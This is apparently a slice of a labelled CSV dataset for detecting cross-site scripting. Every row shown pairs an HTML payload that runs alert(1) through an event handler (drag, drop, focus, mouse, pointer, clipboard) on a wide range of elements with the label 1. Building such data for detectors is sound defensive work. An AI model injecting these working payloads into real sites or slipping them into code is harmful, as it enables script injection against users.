,Sentence,Label
1628,"<div draggable=""true"" contenteditable>drag me</div><element ondrop=alert(1) contenteditable>drop here</element>
",1
1629,"<div draggable=""true"" contenteditable>drag me</div><em ondragover=alert(1) contenteditable>drop here</em>
",1
1630,"<div draggable=""true"" contenteditable>drag me</div><em ondrop=alert(1) contenteditable>drop here</em>
",1
1631,"<div draggable=""true"" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>
",1
1632,"<div draggable=""true"" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>
",1
1633,"<div draggable=""true"" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable>drop here</fieldset>
",1
1634,"<div draggable=""true"" contenteditable>drag me</div><fieldset ondrop=alert(1) contenteditable>drop here</fieldset>
",1
1635,"<div draggable=""true"" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable>drop here</figcaption>
",1
1636,"<div draggable=""true"" contenteditable>drag me</div><figcaption ondrop=alert(1) contenteditable>drop here</figcaption>
",1
1637,"<div draggable=""true"" contenteditable>drag me</div><figure ondragover=alert(1) contenteditable>drop here</figure>
",1
1638,"<div draggable=""true"" contenteditable>drag me</div><figure ondrop=alert(1) contenteditable>drop here</figure>
",1
1639,"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>
",1
1640,"<div draggable=""true"" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>
",1
1641,"<div draggable=""true"" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>
",1
1642,"<div draggable=""true"" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable>drop here</footer>
",1
1643,"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>
",1
1644,"<div draggable=""true"" contenteditable>drag me</div><form ondrop=alert(1) contenteditable>drop here</form>
",1
1645,"<div draggable=""true"" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable>drop here</frame>
",1
1646,"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=alert(1) contenteditable>drop here</frame>
",1
1647,"<div draggable=""true"" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>
",1
1648,"<div draggable=""true"" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable>drop here</frameset>
",1
1649,"<div draggable=""true"" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>
",1
1650,"<div draggable=""true"" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>
",1
1651,"<div draggable=""true"" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>
",1
1652,"<div draggable=""true"" contenteditable>drag me</div><head ondrop=alert(1) contenteditable>drop here</head>
",1
1653,"<div draggable=""true"" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>
",1
1654,"<div draggable=""true"" contenteditable>drag me</div><header ondrop=alert(1) contenteditable>drop here</header>
",1
1655,"<div draggable=""true"" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable>drop here</hgroup>
",1
1656,"<div draggable=""true"" contenteditable>drag me</div><hgroup ondrop=alert(1) contenteditable>drop here</hgroup>
",1
1657,"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>
",1
1658,"<div draggable=""true"" contenteditable>drag me</div><hr ondrop=alert(1) contenteditable>drop here</hr>
",1
1659,"<div draggable=""true"" contenteditable>drag me</div><html ondragover=alert(1) contenteditable>drop here</html>
",1
1660,"<div draggable=""true"" contenteditable>drag me</div><html ondrop=alert(1) contenteditable>drop here</html>
",1
1661,"<div draggable=""true"" contenteditable>drag me</div><i ondragover=alert(1) contenteditable>drop here</i>
",1
1662,"<div draggable=""true"" contenteditable>drag me</div><i ondrop=alert(1) contenteditable>drop here</i>
",1
1663,"<div draggable=""true"" contenteditable>drag me</div><iframe ondragover=alert(1) contenteditable>drop here</iframe>
",1
1664,"<div draggable=""true"" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>
",1
1665,"<div draggable=""true"" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>
",1
1666,"<div draggable=""true"" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>
",1
1667,"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>
",1
1668,"<div draggable=""true"" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>
",1
1669,"<div draggable=""true"" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>
",1
1670,"<div draggable=""true"" contenteditable>drag me</div><input ondrop=alert(1) contenteditable>drop here</input>
",1
1671,"<div draggable=""true"" contenteditable>drag me</div><ins ondragover=alert(1) contenteditable>drop here</ins>
",1
1672,"<div draggable=""true"" contenteditable>drag me</div><ins ondrop=alert(1) contenteditable>drop here</ins>
",1
1673,"<div draggable=""true"" contenteditable>drag me</div><isindex ondragover=alert(1) contenteditable>drop here</isindex>
",1
1674,"<div draggable=""true"" contenteditable>drag me</div><isindex ondrop=alert(1) contenteditable>drop here</isindex>
",1
1675,"<div draggable=""true"" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>
",1
1676,"<div draggable=""true"" contenteditable>drag me</div><kbd ondrop=alert(1) contenteditable>drop here</kbd>
",1
1677,"<div draggable=""true"" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable>drop here</keygen>
",1
1678,"<div draggable=""true"" contenteditable>drag me</div><keygen ondrop=alert(1) contenteditable>drop here</keygen>
",1
1679,"<div draggable=""true"" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>
",1
1680,"<div draggable=""true"" contenteditable>drag me</div><label ondrop=alert(1) contenteditable>drop here</label>
",1
1681,"<div draggable=""true"" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>
",1
1682,"<div draggable=""true"" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>
",1
1683,"<div draggable=""true"" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>
",1
1684,"<div draggable=""true"" contenteditable>drag me</div><li ondrop=alert(1) contenteditable>drop here</li>
",1
1685,"<div draggable=""true"" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>
",1
1686,"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>
",1
1687,"<div draggable=""true"" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>
",1
1688,"<div draggable=""true"" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable>drop here</listing>
",1
1689,"<div draggable=""true"" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>
",1
1690,"<div draggable=""true"" contenteditable>drag me</div><main ondrop=alert(1) contenteditable>drop here</main>
",1
1691,"<div draggable=""true"" contenteditable>drag me</div><map ondragover=alert(1) contenteditable>drop here</map>
",1
1692,"<div draggable=""true"" contenteditable>drag me</div><map ondrop=alert(1) contenteditable>drop here</map>
",1
1693,"<div draggable=""true"" contenteditable>drag me</div><mark ondragover=alert(1) contenteditable>drop here</mark>
",1
1694,"<div draggable=""true"" contenteditable>drag me</div><mark ondrop=alert(1) contenteditable>drop here</mark>
",1
1695,"<div draggable=""true"" contenteditable>drag me</div><marquee ondragover=alert(1) contenteditable>drop here</marquee>
",1
1696,"<div draggable=""true"" contenteditable>drag me</div><marquee ondrop=alert(1) contenteditable>drop here</marquee>
",1
1697,"<div draggable=""true"" contenteditable>drag me</div><menu ondragover=alert(1) contenteditable>drop here</menu>
",1
1698,"<div draggable=""true"" contenteditable>drag me</div><menu ondrop=alert(1) contenteditable>drop here</menu>
",1
1699,"<div draggable=""true"" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>
",1
1700,"<div draggable=""true"" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>
",1
1701,"<div draggable=""true"" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>
",1
1702,"<div draggable=""true"" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable>drop here</meta>
",1
1703,"<div draggable=""true"" contenteditable>drag me</div><meter ondragover=alert(1) contenteditable>drop here</meter>
",1
1704,"<div draggable=""true"" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable>drop here</meter>
",1
1705,"<div draggable=""true"" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable>drop here</multicol>
",1
1706,"<div draggable=""true"" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>
",1
1707,"<div draggable=""true"" contenteditable>drag me</div><nav ondragover=alert(1) contenteditable>drop here</nav>
",1
1708,"<div draggable=""true"" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable>drop here</nav>
",1
1709,"<div draggable=""true"" contenteditable>drag me</div><nextid ondragover=alert(1) contenteditable>drop here</nextid>
",1
1710,"<div draggable=""true"" contenteditable>drag me</div><nextid ondrop=alert(1) contenteditable>drop here</nextid>
",1
1711,"<div draggable=""true"" contenteditable>drag me</div><nobr ondragover=alert(1) contenteditable>drop here</nobr>
",1
1712,"<div draggable=""true"" contenteditable>drag me</div><nobr ondrop=alert(1) contenteditable>drop here</nobr>
",1
1713,"<div draggable=""true"" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable>drop here</noembed>
",1
1714,"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>
",1
1715,"<div draggable=""true"" contenteditable>drag me</div><noframes ondragover=alert(1) contenteditable>drop here</noframes>
",1
1716,"<div draggable=""true"" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable>drop here</noframes>
",1
1717,"<div draggable=""true"" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>
",1
1718,"<div draggable=""true"" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>
",1
1719,"<div draggable=""true"" contenteditable>drag me</div><object ondragover=alert(1) contenteditable>drop here</object>
",1
1720,"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>
",1
1721,"<div draggable=""true"" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>
",1
1722,"<div draggable=""true"" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>
",1
1723,"<div draggable=""true"" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable>drop here</optgroup>
",1
1724,"<div draggable=""true"" contenteditable>drag me</div><optgroup ondrop=alert(1) contenteditable>drop here</optgroup>
",1
1725,"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>
",1
1726,"<div draggable=""true"" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option>
",1
1727,"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>
",1
1728,"<div draggable=""true"" contenteditable>drag me</div><output ondrop=alert(1) contenteditable>drop here</output>
",1
1729,"<div draggable=""true"" contenteditable>drag me</div><p ondragover=alert(1) contenteditable>drop here</p>
",1
1730,"<div draggable=""true"" contenteditable>drag me</div><p ondrop=alert(1) contenteditable>drop here</p>
",1
1731,"<div draggable=""true"" contenteditable>drag me</div><param ondragover=alert(1) contenteditable>drop here</param>
",1
1732,"<div draggable=""true"" contenteditable>drag me</div><param ondrop=alert(1) contenteditable>drop here</param>
",1
1733,"<div draggable=""true"" contenteditable>drag me</div><picture ondragover=alert(1) contenteditable>drop here</picture>
",1
1734,"<div draggable=""true"" contenteditable>drag me</div><picture ondrop=alert(1) contenteditable>drop here</picture>
",1
1735,"<div draggable=""true"" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>
",1
1736,"<div draggable=""true"" contenteditable>drag me</div><plaintext ondrop=alert(1) contenteditable>drop here</plaintext>
",1
1737,"<div draggable=""true"" contenteditable>drag me</div><pre ondragover=alert(1) contenteditable>drop here</pre>
",1
1738,"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>
",1
1739,"<div draggable=""true"" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>
",1
1740,"<div draggable=""true"" contenteditable>drag me</div><progress ondrop=alert(1) contenteditable>drop here</progress>
",1
1741,"<div draggable=""true"" contenteditable>drag me</div><q ondragover=alert(1) contenteditable>drop here</q>
",1
1742,"<div draggable=""true"" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>
",1
1743,"<div draggable=""true"" contenteditable>drag me</div><rb ondragover=alert(1) contenteditable>drop here</rb>
",1
1744,"<div draggable=""true"" contenteditable>drag me</div><rb ondrop=alert(1) contenteditable>drop here</rb>
",1
1745,"<div draggable=""true"" contenteditable>drag me</div><rp ondragover=alert(1) contenteditable>drop here</rp>
",1
1746,"<div draggable=""true"" contenteditable>drag me</div><rp ondrop=alert(1) contenteditable>drop here</rp>
",1
1747,"<div draggable=""true"" contenteditable>drag me</div><rt ondragover=alert(1) contenteditable>drop here</rt>
",1
1748,"<div draggable=""true"" contenteditable>drag me</div><rt ondrop=alert(1) contenteditable>drop here</rt>
",1
1749,"<div draggable=""true"" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable>drop here</rtc>
",1
1750,"<div draggable=""true"" contenteditable>drag me</div><rtc ondrop=alert(1) contenteditable>drop here</rtc>
",1
1751,"<div draggable=""true"" contenteditable>drag me</div><ruby ondragover=alert(1) contenteditable>drop here</ruby>
",1
1752,"<div draggable=""true"" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable>drop here</ruby>
",1
1753,"<div draggable=""true"" contenteditable>drag me</div><s ondragover=alert(1) contenteditable>drop here</s>
",1
1754,"<div draggable=""true"" contenteditable>drag me</div><s ondrop=alert(1) contenteditable>drop here</s>
",1
1755,"<div draggable=""true"" contenteditable>drag me</div><samp ondragover=alert(1) contenteditable>drop here</samp>
",1
1756,"<div draggable=""true"" contenteditable>drag me</div><samp ondrop=alert(1) contenteditable>drop here</samp>
",1
1757,"<div draggable=""true"" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>
",1
1758,"<div draggable=""true"" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>
",1
1759,"<div draggable=""true"" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>
",1
1760,"<div draggable=""true"" contenteditable>drag me</div><section ondrop=alert(1) contenteditable>drop here</section>
",1
1761,"<div draggable=""true"" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>
",1
1762,"<div draggable=""true"" contenteditable>drag me</div><select ondrop=alert(1) contenteditable>drop here</select>
",1
1763,"<div draggable=""true"" contenteditable>drag me</div><shadow ondragover=alert(1) contenteditable>drop here</shadow>
",1
1764,"<div draggable=""true"" contenteditable>drag me</div><shadow ondrop=alert(1) contenteditable>drop here</shadow>
",1
1765,"<div draggable=""true"" contenteditable>drag me</div><slot ondragover=alert(1) contenteditable>drop here</slot>
",1
1766,"<div draggable=""true"" contenteditable>drag me</div><slot ondrop=alert(1) contenteditable>drop here</slot>
",1
1767,"<div draggable=""true"" contenteditable>drag me</div><small ondragover=alert(1) contenteditable>drop here</small>
",1
1768,"<div draggable=""true"" contenteditable>drag me</div><small ondrop=alert(1) contenteditable>drop here</small>
",1
1769,"<div draggable=""true"" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>
",1
1770,"<div draggable=""true"" contenteditable>drag me</div><source ondrop=alert(1) contenteditable>drop here</source>
",1
1771,"<div draggable=""true"" contenteditable>drag me</div><spacer ondragover=alert(1) contenteditable>drop here</spacer>
",1
1772,"<div draggable=""true"" contenteditable>drag me</div><spacer ondrop=alert(1) contenteditable>drop here</spacer>
",1
1773,"<div draggable=""true"" contenteditable>drag me</div><span ondragover=alert(1) contenteditable>drop here</span>
",1
1774,"<div draggable=""true"" contenteditable>drag me</div><span ondrop=alert(1) contenteditable>drop here</span>
",1
1775,"<div draggable=""true"" contenteditable>drag me</div><strike ondragover=alert(1) contenteditable>drop here</strike>
",1
1776,"<div draggable=""true"" contenteditable>drag me</div><strike ondrop=alert(1) contenteditable>drop here</strike>
",1
1777,"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>
",1
1778,"<div draggable=""true"" contenteditable>drag me</div><strong ondrop=alert(1) contenteditable>drop here</strong>
",1
1779,"<div draggable=""true"" contenteditable>drag me</div><style ondragover=alert(1) contenteditable>drop here</style>
",1
1780,"<div draggable=""true"" contenteditable>drag me</div><style ondrop=alert(1) contenteditable>drop here</style>
",1
1781,"<div draggable=""true"" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable>drop here</sub>
",1
1782,"<div draggable=""true"" contenteditable>drag me</div><sub ondrop=alert(1) contenteditable>drop here</sub>
",1
1783,"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>
",1
1784,"<div draggable=""true"" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>
",1
1785,"<div draggable=""true"" contenteditable>drag me</div><sup ondragover=alert(1) contenteditable>drop here</sup>
",1
1786,"<div draggable=""true"" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>
",1
1787,"<div draggable=""true"" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable>drop here</svg>
",1
1788,"<div draggable=""true"" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable>drop here</svg>
",1
1789,"<div draggable=""true"" contenteditable>drag me</div><table ondragover=alert(1) contenteditable>drop here</table>
",1
1790,"<div draggable=""true"" contenteditable>drag me</div><table ondrop=alert(1) contenteditable>drop here</table>
",1
1791,"<div draggable=""true"" contenteditable>drag me</div><tbody ondragover=alert(1) contenteditable>drop here</tbody>
",1
1792,"<div draggable=""true"" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable>drop here</tbody>
",1
1793,"<div draggable=""true"" contenteditable>drag me</div><td ondragover=alert(1) contenteditable>drop here</td>
",1
1794,"<div draggable=""true"" contenteditable>drag me</div><td ondrop=alert(1) contenteditable>drop here</td>
",1
1795,"<div draggable=""true"" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>
",1
1796,"<div draggable=""true"" contenteditable>drag me</div><template ondrop=alert(1) contenteditable>drop here</template>
",1
1797,"<div draggable=""true"" contenteditable>drag me</div><textarea ondragover=alert(1) contenteditable>drop here</textarea>
",1
1798,"<div draggable=""true"" contenteditable>drag me</div><textarea ondrop=alert(1) contenteditable>drop here</textarea>
",1
1799,"<div draggable=""true"" contenteditable>drag me</div><tfoot ondragover=alert(1) contenteditable>drop here</tfoot>
",1
1800,"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>
",1
1801,"<div draggable=""true"" contenteditable>drag me</div><th ondragover=alert(1) contenteditable>drop here</th>
",1
1802,"<div draggable=""true"" contenteditable>drag me</div><th ondrop=alert(1) contenteditable>drop here</th>
",1
1803,"<div draggable=""true"" contenteditable>drag me</div><thead ondragover=alert(1) contenteditable>drop here</thead>
",1
1804,"<div draggable=""true"" contenteditable>drag me</div><thead ondrop=alert(1) contenteditable>drop here</thead>
",1
1805,"<div draggable=""true"" contenteditable>drag me</div><time ondragover=alert(1) contenteditable>drop here</time>
",1
1806,"<div draggable=""true"" contenteditable>drag me</div><time ondrop=alert(1) contenteditable>drop here</time>
",1
1807,"<div draggable=""true"" contenteditable>drag me</div><title ondragover=alert(1) contenteditable>drop here</title>
",1
1808,"<div draggable=""true"" contenteditable>drag me</div><title ondrop=alert(1) contenteditable>drop here</title>
",1
1809,"<div draggable=""true"" contenteditable>drag me</div><tr ondragover=alert(1) contenteditable>drop here</tr>
",1
1810,"<div draggable=""true"" contenteditable>drag me</div><tr ondrop=alert(1) contenteditable>drop here</tr>
",1
1811,"<div draggable=""true"" contenteditable>drag me</div><track ondragover=alert(1) contenteditable>drop here</track>
",1
1812,"<div draggable=""true"" contenteditable>drag me</div><track ondrop=alert(1) contenteditable>drop here</track>
",1
1813,"<div draggable=""true"" contenteditable>drag me</div><tt ondragover=alert(1) contenteditable>drop here</tt>
",1
1814,"<div draggable=""true"" contenteditable>drag me</div><tt ondrop=alert(1) contenteditable>drop here</tt>
",1
1815,"<div draggable=""true"" contenteditable>drag me</div><u ondragover=alert(1) contenteditable>drop here</u>
",1
1816,"<div draggable=""true"" contenteditable>drag me</div><u ondrop=alert(1) contenteditable>drop here</u>
",1
1817,"<div draggable=""true"" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable>drop here</ul>
",1
1818,"<div draggable=""true"" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>
",1
1819,"<div draggable=""true"" contenteditable>drag me</div><var ondragover=alert(1) contenteditable>drop here</var>
",1
1820,"<div draggable=""true"" contenteditable>drag me</div><var ondrop=alert(1) contenteditable>drop here</var>
",1
1821,"<div draggable=""true"" contenteditable>drag me</div><video ondragover=alert(1) contenteditable>drop here</video>
",1
1822,"<div draggable=""true"" contenteditable>drag me</div><video ondrop=alert(1) contenteditable>drop here</video>
",1
1823,"<div draggable=""true"" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable>drop here</wbr>
",1
1824,"<div draggable=""true"" contenteditable>drag me</div><wbr ondrop=alert(1) contenteditable>drop here</wbr>
",1
1825,"<div draggable=""true"" contenteditable>drag me</div><xmp ondragover=alert(1) contenteditable>drop here</xmp>
",1
1826,"<div draggable=""true"" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable>drop here</xmp>
",1
1827,"<div draggable=""true"" ondrag=""alert(1)"">test</div>
",1
1828,"<div draggable=""true"" ondragend=""alert(1)"">test</div>
",1
1829,"<div draggable=""true"" ondragenter=""alert(1)"">test</div>
",1
1830,"<div draggable=""true"" ondragleave=""alert(1)"">test</div>
",1
1831,"<div draggable=""true"" ondragstart=""alert(1)"">test</div>
",1
1832,"<div id=x tabindex=1 onactivate=alert(1)></div>
",1
1833,"<div id=x tabindex=1 onbeforeactivate=alert(1)></div>
",1
1834,"<div id=x tabindex=1 onbeforedeactivate=alert(1)></div><input autofocus>
",1
1835,"<div id=x tabindex=1 ondeactivate=alert(1)></div><input id=y autofocus>
",1
1836,"<div id=x tabindex=1 onfocus=alert(1)></div>
",1
1837,"<div id=x tabindex=1 onfocusin=alert(1)></div>
",1
1838,"<div onbeforecopy=""alert(1)"" contenteditable>test</div>
",1
1839,"<div onbeforecut=""alert(1)"" contenteditable>test</div>
",1
1840,"<div onbeforepaste=""alert(1)"" contenteditable>test</div>
",1
1841,"<div onblur=alert(1) tabindex=1 id=x></div><input autofocus>
",1
1842,"<div onclick=""alert(1)"">test</div>
",1
1843,"<div oncontextmenu=""alert(1)"">test</div>
",1
1844,"<div oncopy=""alert(1)"" contenteditable>test</div>
",1
1845,"<div oncut=""alert(1)"" contenteditable>test</div>
",1
1846,"<div ondblclick=""alert(1)"">test</div>
",1
1847,"<div onfocusout=alert(1) tabindex=1 id=x></div><input autofocus>
",1
1848,"<div onkeydown=""alert(1)"" contenteditable>test</div>
",1
1849,"<div onkeypress=""alert(1)"" contenteditable>test</div>
",1
1850,"<div onkeyup=""alert(1)"" contenteditable>test</div>
",1
1851,"<div onmousedown=""alert(1)"">test</div>
",1
1852,"<div onmouseenter=""alert(1)"">test</div>
",1
1853,"<div onmouseleave=""alert(1)"">test</div>
",1
1854,"<div onmousemove=""alert(1)"">test</div>
",1
1855,"<div onmouseout=""alert(1)"">test</div>
",1
1856,"<div onmouseover=""alert(1)"">test</div>
",1
1857,"<div onmouseup=""alert(1)"">test</div>
",1
1858,"<div onpaste=""alert(1)"" contenteditable>test</div>
",1
1859,"<div onpointerdown=alert(1)>XSS</div>
",1
1860,"<div onpointerenter=alert(1)>XSS</div>
",1
1861,"<div onpointerleave=alert(1)>XSS</div>
",1
1862,"<div onpointermove=alert(1)>XSS</div>
",1
1863,"<div onpointerout=alert(1)>XSS</div>
",1
1864,"<div onpointerover=alert(1)>XSS</div>
",1
1865,"<div onpointerup=alert(1)>XSS</div>
",1
1866,"<dl draggable=""true"" ondrag=""alert(1)"">test</dl>
",1
1867,"<dl draggable=""true"" ondragend=""alert(1)"">test</dl>
",1
1868,"<dl draggable=""true"" ondragenter=""alert(1)"">test</dl>
",1
1869,"<dl draggable=""true"" ondragleave=""alert(1)"">test</dl>
",1
1870,"<dl draggable=""true"" ondragstart=""alert(1)"">test</dl>
",1
1871,"<dl id=x tabindex=1 onactivate=alert(1)></dl>
",1
1872,"<dl id=x tabindex=1 onbeforeactivate=alert(1)></dl>
",1
1873,"<dl id=x tabindex=1 onbeforedeactivate=alert(1)></dl><input autofocus>
",1
1874,"<dl id=x tabindex=1 ondeactivate=alert(1)></dl><input id=y autofocus>
",1
1875,"<dl id=x tabindex=1 onfocus=alert(1)></dl>
",1
1876,"<dl id=x tabindex=1 onfocusin=alert(1)></dl>
",1
1877,"<dl onbeforecopy=""alert(1)"" contenteditable>test</dl>
",1
1878,"<dl onbeforecut=""alert(1)"" contenteditable>test</dl>
",1
1879,"<dl onbeforepaste=""alert(1)"" contenteditable>test</dl>
",1
1880,"<dl onblur=alert(1) tabindex=1 id=x></dl><input autofocus>
",1
1881,"<dl onclick=""alert(1)"">test</dl>
",1
1882,"<dl oncontextmenu=""alert(1)"">test</dl>
",1
1883,"<dl oncopy=""alert(1)"" contenteditable>test</dl>
",1
1884,"<dl oncut=""alert(1)"" contenteditable>test</dl>
",1
1885,"<dl ondblclick=""alert(1)"">test</dl>
",1
1886,"<dl onfocusout=alert(1) tabindex=1 id=x></dl><input autofocus>
",1
1887,"<dl onkeydown=""alert(1)"" contenteditable>test</dl>
",1
1888,"<dl onkeypress=""alert(1)"" contenteditable>test</dl>
",1
1889,"<dl onkeyup=""alert(1)"" contenteditable>test</dl>
",1
1890,"<dl onmousedown=""alert(1)"">test</dl>
",1
1891,"<dl onmouseenter=""alert(1)"">test</dl>
",1
1892,"<dl onmouseleave=""alert(1)"">test</dl>
",1
1893,"<dl onmousemove=""alert(1)"">test</dl>
",1
1894,"<dl onmouseout=""alert(1)"">test</dl>
",1
1895,"<dl onmouseover=""alert(1)"">test</dl>
",1
1896,"<dl onmouseup=""alert(1)"">test</dl>
",1
1897,"<dl onpaste=""alert(1)"" contenteditable>test</dl>
",1
1898,"<dl onpointerdown=alert(1)>XSS</dl>
",1
1899,"<dl onpointerenter=alert(1)>XSS</dl>
",1
1900,"<dl onpointerleave=alert(1)>XSS</dl>
",1
1901,"<dl onpointermove=alert(1)>XSS</dl>
",1
1902,"<dl onpointerout=alert(1)>XSS</dl>
",1
1903,"<dl onpointerover=alert(1)>XSS</dl>
",1
1904,"<dl onpointerup=alert(1)>XSS</dl>
",1
1905,"<dt draggable=""true"" ondrag=""alert(1)"">test</dt>
",1
1906,"<dt draggable=""true"" ondragend=""alert(1)"">test</dt>
",1
1907,"<dt draggable=""true"" ondragenter=""alert(1)"">test</dt>
",1
1908,"<dt draggable=""true"" ondragleave=""alert(1)"">test</dt>
",1
1909,"<dt draggable=""true"" ondragstart=""alert(1)"">test</dt>
",1
1910,"<dt id=x tabindex=1 onactivate=alert(1)></dt>
",1
1911,"<dt id=x tabindex=1 onbeforeactivate=alert(1)></dt>
",1
1912,"<dt id=x tabindex=1 onbeforedeactivate=alert(1)></dt><input autofocus>
",1
1913,"<dt id=x tabindex=1 ondeactivate=alert(1)></dt><input id=y autofocus>
",1
1914,"<dt id=x tabindex=1 onfocus=alert(1)></dt>
",1
1915,"<dt id=x tabindex=1 onfocusin=alert(1)></dt>
",1
